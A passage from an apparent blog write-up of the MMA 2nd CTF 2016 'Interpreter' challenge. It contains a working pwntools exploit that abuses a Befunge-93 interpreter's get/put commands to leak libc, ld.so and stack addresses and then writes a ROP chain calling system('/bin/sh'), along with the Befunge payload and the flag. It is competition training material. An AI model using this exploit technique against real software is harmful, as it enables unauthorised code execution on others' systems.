        <span class="n">v</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">cnt</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
        <span class="k">print</span> <span class="s">"writing %s byte %d : %x"</span> <span class="o">%</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cnt</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">v</span><span class="p">))</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
        <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    
    <span class="c1">#LOCAL = True
</span>    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
    
    <span class="c1"># construct befunge-93 program
</span>    <span class="n">preline</span> <span class="o">=</span> <span class="n">myexec</span><span class="p">(</span><span class="s">"wc -l ./bbb | awk '{print $1}'"</span><span class="p">)</span>
    <span class="n">preline</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">preline</span><span class="p">)</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"./bbb"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">s</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">80</span><span class="o">-</span><span class="n">preline</span><span class="p">)</span>
    
    <span class="n">r</span><span class="p">,</span> <span class="n">LD</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">LOCAL</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
        <span class="n">LD</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/mnt/files/ld-linux-x86-64.so.2"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
        <span class="n">LD</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/lib64/ld-linux-x86-64.so.2"</span><span class="p">)</span>

    <span class="c1"># send program
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; "</span><span class="p">)</span>

    <span class="c1"># leak libc
</span>    <span class="n">libc_main</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="p">(</span><span class="o">-</span><span class="mi">48</span><span class="p">,</span> <span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s">"libc_main"</span><span class="p">)</span>
    <span class="n">libc_base</span><span class="p">,</span> <span class="n">system</span><span class="p">,</span> <span class="n">bin_sh</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>
    <span class="c1"># for local
</span>    <span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
        <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">libc_main</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
        <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span>
        <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
        <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">str_addr</span><span class="p">(</span><span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">,</span> <span class="n">libc</span><span class="p">)</span>
    <span class="c1"># for remote
</span>    <span class="k">else</span><span class="p">:</span> 
        <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_main</span> <span class="o">-</span> <span class="mh">0x21e50</span>
        <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000046590</span>
        <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x17c8c3</span>

    <span class="c1"># leak text base
</span>    <span class="n">text_base</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="p">(</span><span class="o">-</span><span class="mi">56</span><span class="p">,</span> <span class="o">-</span><span class="mi">9</span><span class="p">,</span> <span class="s">"text_base"</span><span class="p">)</span>
    <span class="n">text_base</span> <span class="o">-=</span> <span class="mh">0xb00</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
    
    <span class="c1"># leak r_debug
</span>    <span class="n">r_debug</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">7</span><span class="p">,</span> <span class="s">"r_debug"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"r_debug: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">r_debug</span><span class="p">))</span>

    <span class="c1"># traverse link_map structure &amp; leak ld-linux.so base address
</span>    <span class="n">link_map_addr</span> <span class="o">=</span> <span class="n">r_debug</span> <span class="o">+</span> <span class="mi">8</span>
    <span class="n">link_map_text</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">link_map_addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"link_map_text"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_text: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_text</span><span class="p">))</span>
    <span class="n">link_map_vdso</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">link_map_text</span><span class="o">+</span><span class="mi">24</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"link_map_vdso"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_vdso: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_vdso</span><span class="p">))</span>
    <span class="n">link_map_libc</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">link_map_vdso</span><span class="o">+</span><span class="mi">24</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"link_map_libc"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_libc: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_libc</span><span class="p">))</span>
    <span class="n">link_map_ld</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">link_map_libc</span><span class="o">+</span><span class="mi">24</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"link_map_ld"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"link_map_ld: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map_ld</span><span class="p">))</span>
    <span class="n">ld_base</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">link_map_ld</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"ld_base"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ld_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ld_base</span><span class="p">))</span>
    <span class="c1"># leak __libc_stack_end in ld-linux.so, get stack address
</span>    <span class="n">LD</span><span class="p">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">ld_base</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc_stack_end: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">LD</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_stack_end'</span><span class="p">]))</span>
    <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">leak_far_addr</span><span class="p">(</span><span class="n">LD</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_stack_end'</span><span class="p">],</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"stack addr"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
    
    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x000000000000120c</span>
    <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mi">216</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ret_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"pop_rdi: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"bin_sh: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
    
    <span class="c1"># overwrite return address
</span>    <span class="n">write_far_addr</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"ret_addr"</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="p">)</span>
    <span class="n">write_far_addr</span><span class="p">(</span><span class="n">ret_addr</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"ret_addr+8"</span><span class="p">,</span> <span class="n">bin_sh</span><span class="p">)</span>
    <span class="n">write_far_addr</span><span class="p">(</span><span class="n">ret_addr</span><span class="o">+</span><span class="mi">16</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="s">"ret_addr+16"</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span>

    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">bbb</code> is the Befunge-93 program I used to exploit the service :</p>
<div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre>&gt;                                    v
v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt;
&gt;&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.            v
v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt;
&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v 
v                                    &lt;
&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v 
v                                    &lt;
&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v 
v                                    &lt;
&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v 
v                                    &lt;
&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v 
v                                    &lt;
&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v 
v                                    &lt;
&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv
v                                    &lt; 
&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv
v                                    &lt; 
&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv
v                                    &lt; 
&gt;                                    ^
</pre></td></tr></tbody></table></code></div></div>

<p>flag : <code class="language-plaintext highlighter-rouge">TWCTF{It_1s_eMerG3nCy}</code></p>

<p>After I pass the challenge and ask a girl from HITCON CTF team, she told me that there’s a symbol call <code class="language-plaintext highlighter-rouge">environ</code> in libc, which also store a stack address! And that’s the moment I realized I totally forgot to search the stack address in libc while debugging the program!</p>

<p>So the (way) more elegant way to solve this challenge is to leak the stack address via the <code class="language-plaintext highlighter-rouge">environ</code> symbol after we leak the libc’s base address. Guess I’ve still got a lot to learn in the pwn area :P</p>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/write-ups/'>write-ups</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/python/"
            class="post-tag no-text-decoration" >Python</a>
          
          <a href="/tags/mma/"
            class="post-tag no-text-decoration" >MMA</a>
          
          <a href="/tags/ctf/"
            class="post-tag no-text-decoration" >CTF</a>
          
          <a href="/tags/pwnable/"
            class="post-tag no-text-decoration" >Pwnable</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=MMA 2nd CTF 2016 -- Interpreter - Hacking Tube 2.0&url=http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=MMA 2nd CTF 2016 -- Interpreter - Hacking Tube 2.0&u=http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://0.0.0.0:4000/mma-2nd-ctf-2016-interpreter/" data-toggle="tooltip" data-placement="top"
          title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
          <i class="fa-fw fab fa-linkedin"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

    <div id="access-lastmod" class="post">
      <span>Recent Update</span>
      <ul class="post-content pl-0 pb-1 ml-1 mt-2">

      
        
        
        
        <li><a href="/Migrate-to-Github-Pages/">Migrate to Github Pages</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-Old-School/">MeePwn CTF 2017 -- Old School</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-anotherarena/">MeePwn CTF 2017 -- anotherarena</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-Brainfuck-1-2/">MeePwn CTF 2017 -- Brainfuck 1 & 2</a></li>
      
        
        
        
        <li><a href="/csaw-ctf-2014-exploitation-200-pybabbies/">CSAW CTF 2014 -- Exploitation 200 pybabbies</a></li>
      

      </ul>
    </div> <!-- #access-lastmod -->

  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag" href="/tags/python/">Python</a>
      
        
        <a class="post-tag" href="/tags/pwnable/">Pwnable</a>
      
        
        <a class="post-tag" href="/tags/ppc/">PPC</a>
      
        
        <a class="post-tag" href="/tags/heap/">heap</a>
      
        
        <a class="post-tag" href="/tags/reversing/">Reversing</a>
      
        
        <a class="post-tag" href="/tags/asis/">ASIS</a>
      
        
        <a class="post-tag" href="/tags/c/">C</a>
      
        
        <a class="post-tag" href="/tags/format-string/">format_string</a>
      
        
        <a class="post-tag" href="/tags/33c3/">33C3</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/mma-2nd-ctf-2016-greeting/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Sep 12, 2016
  

  <i class="unloaded">2016-09-12T23:49:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>MMA 2nd CTF 2016 -- greeting</h3>
            <div class="text-muted small">
              <p>
                





                Category: pwn
Points: 150



After a long period of time without playing any CTF, I finally finished my master’s degree and have time to enjoy some CTF challenges. And then there is the Tokyo Weste...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/MeePwn-CTF-2017-Old-School/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Jul 16, 2017
  

  <i class="unloaded">2017-07-16T17:56:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>MeePwn CTF 2017 -- Old School</h3>
            <div class="text-muted small">
              <p>
                





                Category: Pwnable

64 bit ELF, Partial RELRO, NX enabled, No PIE, has canary.



1
2
3
4
5
6
-------- BookStore --------
1.       Add Book.
2.       Edit Book.
3.       Delete Book.
4.       Show B...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/MeePwn-CTF-2017-anotherarena/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Jul 16, 2017
  

  <i class="unloaded">2017-07-16T19:00:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>MeePwn CTF 2017 -- anotherarena</h3>
            <div class="text-muted small">
              <p>
                





                Category: Pwnable

64 bit ELF, Partial RELRO, canary &amp; NX enabled, No PIE.



The program is a simple crackme program with multi-thread. First, the program will read the FLAG into a global buff...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
